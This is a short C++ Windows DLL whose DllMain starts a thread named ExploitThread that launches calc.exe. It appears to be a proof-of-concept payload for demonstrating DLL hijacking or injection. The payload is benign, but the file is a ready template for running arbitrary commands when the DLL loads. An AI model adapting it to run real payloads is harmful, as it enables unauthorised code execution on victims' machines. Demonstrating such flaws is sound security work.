#include <windows.h>
#include <strsafe.h>

void DebugPrintf(LPCSTR lpFormat, ...)
{
    CHAR buf[1024];
    va_list va;

    va_start(va, lpFormat);
    StringCbVPrintfA(buf, sizeof(buf), lpFormat, va);
    OutputDebugStringA(buf);
}

void DebugPrintfW(LPCWSTR lpFormat, ...)
{
	TCHAR buf[1024];
    va_list va;

    va_start(va, lpFormat);
    StringCbVPrintfW(buf, sizeof(buf), lpFormat, va);
	
	DWORD len = WideCharToMultiByte(CP_ACP, 0, buf, -1, NULL, 0, NULL, NULL);
	char *pStr = new char[len + 1];
	memset(pStr, 0, sizeof(char)*(len+1));
	WideCharToMultiByte(CP_ACP, 0, buf, -1, pStr, len, NULL, NULL);
    OutputDebugStringA(pStr);
}

DWORD CALLBACK ExploitThread(LPVOID hModule)
{
	DebugPrintf("ExploitThread started\n");

	WinExec("calc.exe", SW_SHOWNORMAL);

    FreeLibraryAndExitThread((HMODULE)hModule, 0);
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                                         )
{
        UNREFERENCED_PARAMETER(lpReserved);

        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        {
                HANDLE hThread = CreateThread(nullptr, 0, ExploitThread, hModule, 0, nullptr);
                if (hThread == nullptr)
                {
                        DebugPrintf("Error creating thread %08X\n", GetLastError());
                }
                break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
                break;
        }
        return TRUE;
}
